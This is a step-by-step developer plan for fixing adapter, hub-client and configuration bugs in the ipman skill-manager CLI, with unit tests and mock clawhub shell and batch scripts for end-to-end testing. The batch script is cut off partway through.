# OpenClaw Adapter Bugfix + E2E Test Suite Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Fix all P0+P1 bugs from both OpenClaw and Claude Code test reports, and add comprehensive e2e tests with mock agent scripts for cross-platform CI.

**Architecture:** Fix the OpenClaw adapter (`agents/openclaw.py`) to properly pass through CLI flags (`--yes`, `--force`, `--workdir`), add multi-strategy `list_skills()`, fix `IpHubClient` index_url override, fix `hub report` label handling, improve agent detection priority, make machine scope configurable, clarify layering status output, catch `FileNotFoundError` in adapter `_run_cli()` for friendly errors, and auto-inherit agent from active env metadata. All fixes verified by unit tests first, then covered by a new e2e test file using mock agent scripts.

**Tech Stack:** Python 3.10+, Click, pytest, PyYAML, subprocess

**Source reports:**
- `docs/reports/ipman-openclaw-test-20260323-consolidated-report.md`
- `docs/reports/ipman-final-summary-zh.md`

---

## File Map

### Source files to modify

| File | Changes |
|------|---------|
| `src/ipman/agents/base.py` | Add `force`, `workdir` kwargs to `install_skill` signature; add `auto_yes` to `uninstall_skill` |
| `src/ipman/agents/openclaw.py` | Rewrite `list_skills()` with 3-strategy fallback; add `--yes` to uninstall; add `--force`/`--workdir` to install |
| `src/ipman/agents/claude_code.py` | Add `force`/`workdir`/`auto_yes` kwargs (no-op passthrough to maintain interface parity) |
| `src/ipman/cli/skill.py` | Pass `force=True` to adapter when security allows risky install; pass `auto_yes` to uninstall |
| `src/ipman/hub/client.py` | Fix `__init__` so `index_url` is always derived from `base_url` when `base_url` is overridden |
| `src/ipman/cli/hub.py` | Fix `_submit_report()` to fallback when `report` label missing; fix `_get_hub_client()` |
| `src/ipman/cli/env.py` | Fix `_resolve_adapter()` to not default to claude-code when OpenClaw is installed |
| `src/ipman/core/environment.py` | Make machine scope path configurable via `config.yaml`; fix status output for single-active-env |
| `src/ipman/core/config.py` | Add `machine_env_root` field to `IpManConfig` |
| `src/ipman/agents/base.py` | Catch `FileNotFoundError` in `_run_cli()` for friendly error handling |
| `src/ipman/cli/_common.py` | Auto-inherit agent from active env metadata when no `--agent` and no config dir detected |

### Test files to modify

| File | Changes |
|------|---------|
| `tests/test_agents/test_adapters_cli.py` | Add tests for `--yes`, `--force`, `--workdir` passthrough; test `list_skills` fallback strategies |

### New files to create

| File | Purpose |
|------|---------|
| `tests/e2e/mock_clawhub/clawhub` | Bash mock script for Unix |
| `tests/e2e/mock_clawhub/clawhub.bat` | Batch mock script for Windows |
| `tests/e2e/mock_clawhub/clawhub.ps1` | PowerShell mock script for Windows |
| `tests/e2e/test_openclaw_compat.py` | Comprehensive e2e tests covering all report scenarios |
| `tests/e2e/conftest_mock.py` | Fixtures for mock clawhub setup |

---

## Task 1: OpenClaw adapter — `list_skills()` fallback chain

**Files:**
- Modify: `src/ipman/agents/openclaw.py:74-91`
- Test: `tests/test_agents/test_adapters_cli.py`

The current `list_skills()` only tries `clawhub list --json`, which doesn't exist in clawhub 0.8.0. We need a 3-strategy fallback: try `--json` first, then parse plain text output, then read `.clawhub/lock.json`.

- [ ] **Step 1: Write failing tests for list_skills fallback**

Add to `tests/test_agents/test_adapters_cli.py`:

```python
class TestOpenClawSkillListFallback:
    """Test list_skills 3-strategy fallback: --json -> plain text -> lockfile."""

    def setup_method(self) -> None:
        self.adapter = OpenClawAdapter()

    @patch("subprocess.run")
    def test_list_skills_json_success(self, mock_run) -> None:
        """Strategy 1: --json works — use it."""
        output = json.dumps([
            {"name": "web-scraper", "version": "1.0.0"},
            {"name": "git-helper", "version": "2.0.0"},
        ])
        mock_run.return_value = subprocess.CompletedProcess(
            args=[], returncode=0, stdout=output, stderr="",
        )
        skills = self.adapter.list_skills()
        assert len(skills) == 2
        assert skills[0].name == "web-scraper"
        assert skills[1].name == "git-helper"

    @patch("subprocess.run")
    def test_list_skills_json_fails_plain_text_works(self, mock_run) -> None:
        """Strategy 2: --json fails, parse plain text."""
        def side_effect(args, **kwargs):
            if "--json" in args:
                return subprocess.CompletedProcess(
                    args=args, returncode=1,
                    stdout="", stderr="unknown flag: --json",
                )
            # Plain text output from clawhub list
            return subprocess.CompletedProcess(
                args=args, returncode=0,
                stdout="web-scraper  1.0.0  enabled\ngit-helper  2.0.0  enabled\n",
                stderr="",
            )
        mock_run.side_effect = side_effect
        skills = self.adapter.list_skills()
        assert len(skills) == 2
        assert skills[0].name == "web-scraper"
        assert skills[0].version == "1.0.0"

    @patch("subprocess.run")
    def test_list_skills_both_cli_fail_lockfile_works(self, mock_run, tmp_path) -> None:
        """Strategy 3: both CLI calls fail, read .clawhub/lock.json."""
        mock_run.return_value = subprocess.CompletedProcess(
            args=[], returncode=1, stdout="", stderr="command not found",
        )
        lock_dir = tmp_path / ".clawhub"
        lock_dir.mkdir()
        lock_file = lock_dir / "lock.json"
        lock_file.write_text(json.dumps({
            "skills": {
                "web-scraper": {"version": "1.0.0"},
                "git-helper": {"version": "2.0.0"},
            }
        }))
        skills = self.adapter.list_skills(workdir=tmp_path)
        assert len(skills) == 2

    @patch("subprocess.run")
    def test_list_skills_all_strategies_fail(self, mock_run) -> None:
        """All strategies fail — return empty list."""
        mock_run.return_value = subprocess.CompletedProcess(
            args=[], returncode=1, stdout="", stderr="error",
        )
        skills = self.adapter.list_skills()
        assert skills == []

    @patch("subprocess.run")
    def test_list_skills_plain_text_various_formats(self, mock_run) -> None:
        """Parse plain text with different separators."""
        def side_effect(args, **kwargs):
            if "--json" in args:
                return subprocess.CompletedProcess(
                    args=args, returncode=1, stdout="", stderr="",
                )
            return subprocess.CompletedProcess(
                args=args, returncode=0,
                stdout="  skill-a    1.2.3\n  skill-b\n",
                stderr="",
            )
        mock_run.side_effect = side_effect
        skills = self.adapter.list_skills()
        assert len(skills) == 2
        assert skills[0].name == "skill-a"
        assert skills[0].version == "1.2.3"
        assert skills[1].name == "skill-b"
        assert skills[1].version == ""
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/test_agents/test_adapters_cli.py::TestOpenClawSkillListFallback -v`
Expected: FAIL (new methods/signatures don't exist yet)

- [ ] **Step 3: Implement list_skills fallback in OpenClawAdapter**

Replace `list_skills` in `src/ipman/agents/openclaw.py`:

```python
def list_skills(self, workdir: Path | None = None) -> list[SkillInfo]:
    """List installed skills with 3-strategy fallback.

    1. Try ``clawhub list --json``
    2. Fall back to parsing ``clawhub list`` plain text
    3. Fall back to reading ``.clawhub/lock.json``
    """
    # Strategy 1: try --json
    result = self._run_cli(["clawhub", "list", "--json"])
    if result.returncode == 0:
        try:
            skills = json.loads(result.stdout)
            return [
                SkillInfo(
                    name=s.get("name", ""),
                    version=s.get("version", ""),
                )
                for s in skills
            ]
        except (json.JSONDecodeError, TypeError):
            pass

    # Strategy 2: parse plain text
    result_plain = self._run_cli(["clawhub", "list"])
    if result_plain.returncode == 0 and result_plain.stdout.strip():
        return self._parse_plain_list(result_plain.stdout)

    # Strategy 3: read lockfile
    return self._read_lockfile(workdir or Path.cwd())

@staticmethod
def _parse_plain_list(output: str) -> list[SkillInfo]:
    """Parse plain text output from ``clawhub list``."""
    skills: list[SkillInfo] = []
    for line in output.strip().splitlines():
        parts = line.split()
        if not parts:
            continue
        name = parts[0]
        version = parts[1] if len(parts) > 1 else ""
        # Skip header/separator lines
        if name.startswith("-") or name.startswith("="):
            continue
        skills.append(SkillInfo(name=name, version=version))
    return skills

@staticmethod
def _read_lockfile(workdir: Path) -> list[SkillInfo]:
    """Read skills from .clawhub/lock.json as last resort."""
    lock_file = workdir / ".clawhub" / "lock.json"
    if not lock_file.exists():
        return []
    try:
        data = json.loads(lock_file.read_text(encoding="utf-8"))
        skills_data = data.get("skills", {})
        return [
            SkillInfo(name=name, version=info.get("version", ""))
            for name, info in skills_data.items()
        ]
    except (json.JSONDecodeError, TypeError, AttributeError):
        return []
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/test_agents/test_adapters_cli.py::TestOpenClawSkillListFallback -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/ipman/agents/openclaw.py tests/test_agents/test_adapters_cli.py
git commit -m "fix(openclaw): add 3-strategy fallback for list_skills (P0#1)"
```

---

## Task 2: OpenClaw adapter — `--yes` passthrough for uninstall

**Files:**
- Modify: `src/ipman/agents/base.py:69-70`
- Modify: `src/ipman/agents/openclaw.py:66-72`
- Modify: `src/ipman/agents/claude_code.py:66-72`
- Modify: `src/ipman/cli/skill.py:281-297`
- Test: `tests/test_agents/test_adapters_cli.py`

- [ ] **Step 1: Write failing test**

Add to `tests/test_agents/test_adapters_cli.py` in `TestOpenClawSkillUninstall`:

```python
@patch("subprocess.run")
def test_uninstall_skill_passes_yes(self, mock_run) -> None:
    mock_run.return_value = subprocess.CompletedProcess(
        args=[], returncode=0, stdout="", stderr="",
    )
    self.adapter.uninstall_skill("web-scraper", auto_yes=True)
    args = mock_run.call_args[0][0]
    assert "--yes" in args

@patch("subprocess.run")
def test_uninstall_skill_default_includes_yes(self, mock_run) -> None:
    """Default behavior should include --yes for non-interactive safety."""
    mock_run.return_value = subprocess.CompletedProcess(
        args=[], returncode=0, stdout="", stderr="",
    )
    self.adapter.uninstall_skill("web-scraper")
    args = mock_run.call_args[0][0]
    assert "--yes" in args
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/test_agents/test_adapters_cli.py::TestOpenClawSkillUninstall -v`
Expected: FAIL

- [ ] **Step 3: Update base.py signature**

In `src/ipman/agents/base.py`, change `uninstall_skill`:

```python
@abstractmethod
def uninstall_skill(
    self, name: str, *, auto_yes: bool = True,
) -> subprocess.CompletedProcess[str]:
    """Uninstall a skill via agent's native CLI command."""
```

- [ ] **Step 4: Update OpenClawAdapter.uninstall_skill**

In `src/ipman/agents/openclaw.py`:

```python
def uninstall_skill(
    self, name: str, *, auto_yes: bool = True,
) -> subprocess.CompletedProcess[str]:
    """Uninstall a skill via ``clawhub uninstall``."""
    args = ["clawhub", "uninstall", name]
    if auto_yes:
        args.append("--yes")
    return self._run_cli(args)
```

- [ ] **Step 5: Update ClaudeCodeAdapter.uninstall_skill to accept kwarg**

In `src/ipman/agents/claude_code.py`:

```python
def uninstall_skill(
    self, name: str, *, auto_yes: bool = True,
) -> subprocess.CompletedProcess[str]:
    """Uninstall a plugin via ``claude plugin uninstall``."""
    return self._run_cli(
        ["claude", "plugin", "uninstall", name],
    )
```

- [ ] **Step 6: Update CLI uninstall command to pass auto_yes**

In `src/ipman/cli/skill.py`, add `--yes` to the uninstall command and pass it through:

```python
@click.command()
@click.argument("name")
@click.option("--agent", "agent_name", default=None,
              help="Agent tool to use (e.g. claude-code, openclaw).")
@click.option("--yes", "auto_yes", is_flag=True, default=False,
              help="Skip confirmation prompts (non-interactive mode).")
def uninstall(name: str, agent_name: str | None, auto_yes: bool) -> None:
    """Uninstall a skill via the agent's native CLI."""
    adapter = _resolve_agent(agent_name)
    result = adapter.uninstall_skill(name, auto_yes=auto_yes)
    ...
```

- [ ] **Step 7: Run tests to verify they pass**

Run: `uv run pytest tests/test_agents/test_adapters_cli.py::TestOpenClawSkillUninstall -v`
Expected: PASS

- [ ] **Step 8: Commit**

```bash
git add src/ipman/agents/base.py src/ipman/agents/openclaw.py src/ipman/agents/claude_code.py src/ipman/cli/skill.py tests/test_agents/test_adapters_cli.py
git commit -m "fix(openclaw): add --yes passthrough for uninstall (P0#2)"
```

---

## Task 3: OpenClaw adapter — `--force` and `--workdir` passthrough for install

**Files:**
- Modify: `src/ipman/agents/base.py:61-63`
- Modify: `src/ipman/agents/openclaw.py:39-64`
- Modify: `src/ipman/agents/claude_code.py:39-64`
- Modify: `src/ipman/cli/skill.py:227-278`
- Test: `tests/test_agents/test_adapters_cli.py`

- [ ] **Step 1: Write failing tests**

Add to `tests/test_agents/test_adapters_cli.py`:

```python
class TestOpenClawInstallFlags:
    """Test --force and --workdir passthrough."""

    def setup_method(self) -> None:
        self.adapter = OpenClawAdapter()

    @patch("subprocess.run")
    def test_install_with_force(self, mock_run) -> None:
        mock_run.return_value = subprocess.CompletedProcess(
            args=[], returncode=0, stdout="", stderr="",
        )
        self.adapter.install_skill("risky-skill", force=True)
        args = mock_run.call_args[0][0]
        assert "--force" in args

    @patch("subprocess.run")
    def test_install_with_workdir(self, mock_run) -> None:
        mock_run.return_value = subprocess.CompletedProcess(
            args=[], returncode=0, stdout="", stderr="",
        )
        self.adapter.install_skill("web-scraper", workdir="/tmp/myproject")
        args = mock_run.call_args[0][0]
        assert "--workdir" in args
        idx = args.index("--workdir")
        assert args[idx + 1] == "/tmp/myproject"

    @patch("subprocess.run")
    def test_install_without_force(self, mock_run) -> None:
        mock_run.return_value = subprocess.CompletedProcess(
            args=[], returncode=0, stdout="", stderr="",
        )
        self.adapter.install_skill("safe-skill")
        args = mock_run.call_args[0][0]
        assert "--force" not in args
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/test_agents/test_adapters_cli.py::TestOpenClawInstallFlags -v`
Expected: FAIL

- [ ] **Step 3: Update OpenClawAdapter.install_skill**

```python
def install_skill(
    self, name: str, **kwargs: str | bool | None,
) -> subprocess.CompletedProcess[str]:
    path = Path(name)
    if path.exists() and path.is_dir():
        config_dir = kwargs.get("config_dir")
        if config_dir:
            dest = Path(str(config_dir)) / "skills" / path.name
        else:
            dest = Path.cwd() / ".openclaw" / "skills" / path.name
        dest.parent.mkdir(parents=True, exist_ok=True)
        shutil.copytree(path, dest, dirs_exist_ok=True)
        return subprocess.CompletedProcess(
            args=[], returncode=0,
            stdout=f"Copied to {dest}\n", stderr="",
        )
    args = ["clawhub", "install", name]
    hub = kwargs.get("hub")
    if hub:
        args.extend(["--hub", str(hub)])
    if kwargs.get("force"):
        args.append("--force")
    workdir = kwargs.get("workdir")
    if workdir:
        args.extend(["--workdir", str(workdir)])
    return self._run_cli(args)
```

- [ ] **Step 4: Update CLI install to pass force when security allows risky install**

In `src/ipman/cli/skill.py`, in the `install()` function, after `_enforce_security` returns True on a warned/risky skill, pass `force=True` to the adapter:

```python
# After the security enforcement section, when calling adapter.install_skill,
# determine if force is needed:
force_install = False
if should_vet and not dry_run:
    # If we got here, security allowed it — pass force to adapter
    if report.risk_level.value >= 1:  # MEDIUM or above
        force_install = True

# Then in the install calls, pass force=force_install:
result = adapter.install_skill(source, force=force_install)
```

- [ ] **Step 5: Run tests**

Run: `uv run pytest tests/test_agents/test_adapters_cli.py::TestOpenClawInstallFlags -v`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add src/ipman/agents/base.py src/ipman/agents/openclaw.py src/ipman/agents/claude_code.py src/ipman/cli/skill.py tests/test_agents/test_adapters_cli.py
git commit -m "fix(openclaw): add --force/--workdir passthrough for install (P0#3,4)"
```

---

## Task 4: Fix IpHubClient — `IPMAN_HUB_URL` must override `index_url`

**Files:**
- Modify: `src/ipman/hub/client.py:28-38`
- Modify: `src/ipman/cli/skill.py:90-94`
- Modify: `src/ipman/cli/hub.py:33-37`
- Test: `tests/test_hub/test_client.py`

- [ ] **Step 1: Write failing test**

Add to `tests/test_hub/test_client.py`:

```python
class TestIpHubClientIndexUrl:
    def test_base_url_overrides_index_url(self) -> None:
        """When base_url is set, index_url should derive from it."""
        client = IpHubClient(base_url="https://custom.example.com/repo/main")
        assert client._index_url == "https://custom.example.com/repo/main/index.yaml"

    def test_default_index_url(self) -> None:
        """Without override, index_url uses the default GitHub raw URL."""
        client = IpHubClient()
        assert "raw.githubusercontent.com" in client._index_url
        assert client._index_url.endswith("/index.yaml")

    def test_explicit_index_url_preserved(self) -> None:
        """Explicit index_url should be respected even with base_url."""
        client = IpHubClient(
            base_url="https://custom.example.com",
            index_url="https://other.example.com/index.yaml",
        )
        assert client._index_url == "https://other.example.com/index.yaml"
```

- [ ] **Step 2: Run to verify failure**

Run: `uv run pytest tests/test_hub/test_client.py::TestIpHubClientIndexUrl -v`
Expected: FAIL (first test — base_url doesn't override index_url)

- [ ] **Step 3: Fix IpHubClient.__init__**

In `src/ipman/hub/client.py`:

```python
def __init__(
    self,
    cache_dir: Path | None = None,
    index_url: str | None = None,
    base_url: str | None = None,
) -> None:
    self._base_url = base_url or (
        "https://raw.githubusercontent.com"
        f"/{_DEFAULT_REPO}/{_DEFAULT_BRANCH}"
    )
    # index_url: explicit > derived from base_url > default
    if index_url:
        self._index_url = index_url
    elif base_url:
        self._index_url = f"{self._base_url}/index.yaml"
    else:
        self._index_url = _INDEX_URL
    self._cache_dir = cache_dir or Path.home() / ".ipman" / "cache"
    self._cache_file = self._cache_dir / "index.yaml"
    self._index: dict[str, Any] | None = None
```

Note the key change: when `base_url` is explicitly passed (not None), derive `index_url` from it. When neither is passed, use the hardcoded `_INDEX_URL` constant. When `index_url` is explicitly passed, always use it.

- [ ] **Step 4: Run tests**

Run: `uv run pytest tests/test_hub/test_client.py::TestIpHubClientIndexUrl -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/ipman/hub/client.py tests/test_hub/test_client.py
git commit -m "fix(hub): IPMAN_HUB_URL now overrides index_url (P0#6)"
```

---

## Task 5: Fix `hub report` — graceful label fallback

**Files:**
- Modify: `src/ipman/cli/hub.py:16-30`
- Test: `tests/test_cli/test_hub.py`

- [ ] **Step 1: Write failing test**

Add to `tests/test_cli/test_hub.py`:

```python
class TestReportLabelFallback:
    @patch("ipman.cli.hub._submit_report")
    @patch("ipman.cli.hub._get_hub_client")
    @patch("ipman.cli.hub.get_github_username")
    def test_report_retries_without_label(
        self, mock_username, mock_client, mock_submit, cli_runner,
    ):
        """If report label doesn't exist, retry without it."""
        mock_username.return_value = "testuser"
        mock_client.return_value.lookup.return_value = {"name": "bad-skill"}

        # First call fails with label error, second succeeds
        mock_submit.side_effect = [
            subprocess.CompletedProcess(
                args=[], returncode=1,
                stdout="", stderr="could not add label: 'report' not found",
            ),
            subprocess.CompletedProcess(
                args=[], returncode=0,
                stdout="https://github.com/twisker/iphub/issues/1\n",
                stderr="",
            ),
        ]

        result = cli_runner.invoke(
            hub, ["report", "bad-skill", "--reason", "suspicious"],
        )
        assert result.exit_code == 0
        assert mock_submit.call_count == 2
```

- [ ] **Step 2: Run to verify failure**

Run: `uv run pytest tests/test_cli/test_hub.py::TestReportLabelFallback -v`
Expected: FAIL

- [ ] **Step 3: Fix _submit_report and report_cmd**

In `src/ipman/cli/hub.py`, update `_submit_report`:

```python
def _submit_report(
    name: str, body: str, *, with_label: bool = True,
) -> subprocess.CompletedProcess[str]:
    """Submit a report issue to IpHub via gh CLI."""
    import subprocess as _sp
    args = [
        "gh", "issue", "create",
        "--repo", "twisker/iphub",
        "--title", f"[report] {name}",
        "--body", body,
    ]
    if with_label:
        args.extend(["--label", "report"])
    return _sp.run(
        args, capture_output=True, text=True, check=False,
    )
```

Update `report_cmd`:

```python
@hub.command("report")
@click.argument("name")
@click.option("--reason", "-r", required=True,
              help="Reason for reporting (required).")
def report_cmd(name: str, reason: str) -> None:
    """Report a suspicious skill or package."""
    try:
        username = get_github_username()
    except PublishError as e:
        raise click.ClickException(str(e)) from e

    client = _get_hub_client()
    entry = client.lookup(name)
    if entry is None:
        raise click.ClickException(f"'{name}' not found in IpHub.")

    body = f"Report by @{username}: {reason}"
    result = _submit_report(name, body, with_label=True)

    # Fallback: if label doesn't exist, retry without it
    if result.returncode != 0 and "label" in (result.stderr or "").lower():
        result = _submit_report(name, body, with_label=False)

    if result.returncode != 0:
        msg = result.stderr.strip() or "Failed to submit report"
        raise click.ClickException(msg)

    click.secho(
        f"Reported '{name}'. Thank you for helping keep IpHub safe.",
        fg="green",
    )
```

- [ ] **Step 4: Run tests**

Run: `uv run pytest tests/test_cli/test_hub.py::TestReportLabelFallback -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/ipman/cli/hub.py tests/test_cli/test_hub.py
git commit -m "fix(hub): report falls back when 'report' label missing (P0#7)"
```

---

## Task 6: Fix agent detection — don't default to claude-code

**Files:**
- Modify: `src/ipman/cli/env.py:33-41`
- Modify: `src/ipman/agents/registry.py:28-35`
- Test: `tests/test_agents/test_adapters_cli.py`

The issue: `_resolve_adapter` in `cli/env.py` hardcodes fallback to `claude-code`. When OpenClaw is installed but no config dir exists yet (new project), the user gets claude-code by default.

- [ ] **Step 1: Write failing test**

```python
class TestAgentDetectionPriority:
    @patch("ipman.agents.registry.detect_agent", return_value=None)
    def test_fallback_prefers_installed_agent(self, mock_detect) -> None:
        """When no config dir exists, prefer first installed agent."""
        from ipman.agents.registry import detect_installed_agents
        installed = detect_installed_agents()
        # If openclaw is installed but claude-code is not, openclaw should win
        # This test just verifies the fallback function exists and works
        from ipman.cli.env import _resolve_adapter
        result = _resolve_adapter(None, Path("/tmp/nonexistent"))
        assert result is not None
```

- [ ] **Step 2: Fix _resolve_adapter in cli/env.py**

```python
def _resolve_adapter(agent: str | None, project_path: Path) -> object:
    """Resolve the agent adapter from --agent flag or auto-detection."""
    if agent:
        return get_adapter(agent)
    detected = detect_agent(project_path)
    if detected:
        return detected
    # Fallback: prefer first installed agent instead of hardcoding claude-code
    from ipman.agents.registry import detect_installed_agents
    installed = detect_installed_agents()
    if installed:
        return installed[0]
    # Last resort: claude-code (even if not installed)
    return get_adapter("claude-code")
```

- [ ] **Step 3: Run all agent tests**

Run: `uv run pytest tests/test_agents/ tests/test_cli/test_env.py -v`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add src/ipman/cli/env.py tests/test_agents/test_adapters_cli.py
git commit -m "fix(env): prefer installed agent over hardcoded claude-code fallback (P1#8)"
```

---

## Task 7: Make machine scope path configurable

**Files:**
- Modify: `src/ipman/core/config.py`
- Modify: `src/ipman/core/environment.py:46-61`
- Test: `tests/test_core/test_environment.py`

- [ ] **Step 1: Write failing test**

Add to `tests/test_core/test_environment.py`:

```python
class TestMachineScopeConfig:
    def test_machine_scope_uses_config(self, tmp_path, monkeypatch) -> None:
        """Machine scope respects IPMAN_MACHINE_ROOT env var."""
        custom_root = tmp_path / "custom_machine"
        monkeypatch.setenv("IPMAN_MACHINE_ROOT", str(custom_root))
        from ipman.core.environment import get_envs_root, Scope
        result = get_envs_root(Scope.MACHINE)
        assert str(custom_root) in str(result)

    def test_machine_scope_config_yaml(self, tmp_path, monkeypatch) -> None:
        """Machine scope reads from config.yaml when env var not set."""
        monkeypatch.delenv("IPMAN_MACHINE_ROOT", raising=False)
        config_dir = tmp_path / "config"
        config_dir.mkdir()
        import yaml
        (config_dir / "config.yaml").write_text(
            yaml.dump({"machine": {"env_root": str(tmp_path / "my_envs")}})
        )
        from ipman.core.config import load_config
        cfg = load_config(config_dir=config_dir)
        assert cfg.machine_env_root == str(tmp_path / "my_envs")
```

- [ ] **Step 2: Add machine_env_root to IpManConfig**

In `src/ipman/core/config.py`:

```python
@dataclass(frozen=True)
class IpManConfig:
    security_mode: SecurityMode = SecurityMode.DEFAULT
    log_enabled: bool = True
    log_path: Path = field(
        default_factory=lambda: Path.home() / ".ipman" / "security.log",
    )
    hub_url: str = _DEFAULT_HUB_URL
    agent_default: str = "auto"
    machine_env_root: str = ""
```

In `load_config()`, add:

```python
machine = data.get("machine", {}) or {}
machine_env_root = machine.get("env_root", "")
env_machine_root = os.environ.get("IPMAN_MACHINE_ROOT", "")
if env_machine_root:
    machine_env_root = env_machine_root
```

And pass to constructor:
```python
return IpManConfig(
    ...,
    machine_env_root=machine_env_root,
)
```

- [ ] **Step 3: Update get_envs_root to use config**

In `src/ipman/core/environment.py`, update the MACHINE branch of `get_envs_root`:

```python
if scope == Scope.MACHINE:
    override = os.environ.get("IPMAN_MACHINE_ROOT")
    if override:
        return Path(override) / "envs"
    # Try config file
    from ipman.core.config import load_config
    cfg = load_config()
    if cfg.machine_env_root:
        return Path(cfg.machine_env_root) / "envs"
    if _is_windows():
        return Path("C:/ProgramData/ipman/envs")
    # Use XDG-style fallback on Unix
    xdg_data = os.environ.get("XDG_DATA_HOME", "")
    if xdg_data:
        return Path(xdg_data) / "ipman" / "envs"
    return Path("/opt/ipman/envs")
```

- [ ] **Step 4: Run tests**

Run: `uv run pytest tests/test_core/test_environment.py::TestMachineScopeConfig -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/ipman/core/config.py src/ipman/core/environment.py tests/test_core/test_environment.py
git commit -m "fix(env): make machine scope path configurable (P1#9)"
```

---

## Task 8: Fix layering status output

**Files:**
- Modify: `src/ipman/cli/env.py:264-291`
- Test: `tests/test_cli/test_env.py`

The status command's text implies multi-scope layering (machine + user + project stacking), but only one env can be active at a time. Fix the output to be accurate.

- [ ] **Step 1: Write failing test**

```python
def test_status_shows_single_active_env(cli_runner, tmp_path, monkeypatch):
    """Status output should clarify there is one active env, not layered."""
    # ... (set up a project-scope active env)
    result = cli_runner.invoke(env, ["status"])
    assert "Active environment" in result.output or "active" in result.output.lower()
    # Should NOT say "layers" or imply stacking
    assert "layer" not in result.output.lower()
```

- [ ] **Step 2: Update status_cmd output**

In `src/ipman/cli/env.py`, update `status_cmd`:

```python
@env.command("status")
def status_cmd() -> None:
    """Show active environment status."""
    project_path = Path.cwd()
    prompt_tag = build_prompt_tag(project_path)
    status = get_env_status(project_path)

    if not status:
        click.echo("No active environment.")
        return

    if len(status) == 1:
        entry = status[0]
        click.echo(f"Active environment: {entry['name']}")
        click.echo(f"  Scope:  {entry['scope']}")
        click.echo(f"  Agent:  {entry['agent']}")
        click.echo(f"  Path:   {entry['path']}")
        if prompt_tag:
            click.echo(f"  Prompt: {prompt_tag}")
    else:
        click.echo(f"Prompt: {prompt_tag}\n")
        for entry in status:
            scope = entry["scope"]
            click.secho(f"  {scope.capitalize()}", fg="cyan", nl=False)
            click.echo(
                f": {entry['name']}  "
                f"(agent: {entry['agent']}, path: {entry['path']})"
            )
```

- [ ] **Step 3: Run tests**

Run: `uv run pytest tests/test_cli/test_env.py -v`
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add src/ipman/cli/env.py tests/test_cli/test_env.py
git commit -m "fix(env): clarify status output for single-active-env model (P1#10)"
```

---

## Task 9: Create mock clawhub scripts for e2e testing

**Files:**
- Create: `tests/e2e/mock_clawhub/clawhub` (Bash — Unix)
- Create: `tests/e2e/mock_clawhub/clawhub.bat` (Windows CMD)
- Create: `tests/e2e/mock_clawhub/README.md` (usage notes)

The mock clawhub must simulate realistic clawhub 0.8.0 behavior:
- `clawhub install <name>` → create skill dir, exit 0
- `clawhub install <name> --force` → create skill dir, exit 0
- `clawhub install <name> --workdir <dir>` → create skill in specified dir
- `clawhub uninstall <name> --yes` → remove skill dir, exit 0
- `clawhub uninstall <name>` (no --yes) → exit 1 "Pass --yes (no input)"
- `clawhub list` → print installed skills as plain text
- `clawhub list --json` → exit 1 "unknown flag: --json"
- All operations persist state in `$MOCK_CLAWHUB_STATE` dir (env var)

- [ ] **Step 1: Create Unix mock script**

Create `tests/e2e/mock_clawhub/clawhub`:

```bash
#!/usr/bin/env bash
# Mock clawhub 0.8.0 for E2E testing
# State dir: $MOCK_CLAWHUB_STATE (must be set by test fixture)
set -euo pipefail

STATE="${MOCK_CLAWHUB_STATE:-.mock_clawhub_state}"
SKILLS_DIR="$STATE/skills"
mkdir -p "$SKILLS_DIR"

CMD="${1:-}"
shift || true

case "$CMD" in
  install)
    NAME="${1:-}"
    shift || true
    FORCE=false
    WORKDIR=""
    while [[ $# -gt 0 ]]; do
      case "$1" in
        --force) FORCE=true; shift ;;
        --hub) shift; shift ;;  # consume value
        --workdir) shift; WORKDIR="$1"; shift ;;
        *) shift ;;
      esac
    done
    if [[ -z "$NAME" ]]; then
      echo "error: missing skill name" >&2; exit 1
    fi
    TARGET="${WORKDIR:-$SKILLS_DIR}"
    mkdir -p "$TARGET/$NAME"
    echo "---" > "$TARGET/$NAME/SKILL.md"
    echo "name: $NAME" >> "$TARGET/$NAME/SKILL.md"
    echo "---" >> "$TARGET/$NAME/SKILL.md"
    echo "Installed $NAME"
    exit 0
    ;;
  uninstall)
    NAME="${1:-}"
    shift || true
    YES=false
    while [[ $# -gt 0 ]]; do
      case "$1" in
        --yes) YES=true; shift ;;
        *) shift ;;
      esac
    done
    if [[ -z "$NAME" ]]; then
      echo "error: missing skill name" >&2; exit 1
    fi
    if [[ "$YES" != "true" ]]; then
      echo "error: Pass --yes (no input)" >&2; exit 1
    fi
    rm -rf "$SKILLS_DIR/$NAME"
    echo "Uninstalled $NAME"
    exit 0
    ;;
  list)
    if [[ "${1:-}" == "--json" ]]; then
      echo "error: unknown flag: --json" >&2; exit 1
    fi
    for d in "$SKILLS_DIR"/*/; do
      [[ -d "$d" ]] || continue
      NAME=$(basename "$d")
      VERSION="1.0.0"
      echo "$NAME  $VERSION  enabled"
    done
    exit 0
    ;;
  *)
    echo "error: unknown command: $CMD" >&2
    exit 1
    ;;
esac
```

- [ ] **Step 2: Create Windows mock script**

Create `tests/e2e/mock_clawhub/clawhub.bat`:

```batch
@echo off
setlocal enabledelayedexpansion

if "%MOCK_CLAWHUB_STATE%"=="" set "MOCK_CLAWHUB_STATE=.mock_clawhub_state"
set "SKILLS_DIR=%MOCK_CLAWHUB_STATE%\skills"
if not exist "%SKILLS_DIR%" mkdir "%SKILLS_DIR%"

set "CMD=%~1"
shift

if "%CMD%"=="install" goto :install
if "%CMD%"=="uninstall" goto :uninstall
if "%CMD%"=="list" goto :list
echo error: unknown command: %CMD% >&2
exit /b 1

:install
set "NAME=%~1"
shift
set "FORCE=false"
set "WORKDIR="
:install_loop
if "%~1"=="" goto :install_exec
if "%~1"=="--force" (set "FORCE=true" & shift & goto :install_loop)
if "%~1"=="--hub" (shift & shift & goto :install_loop)
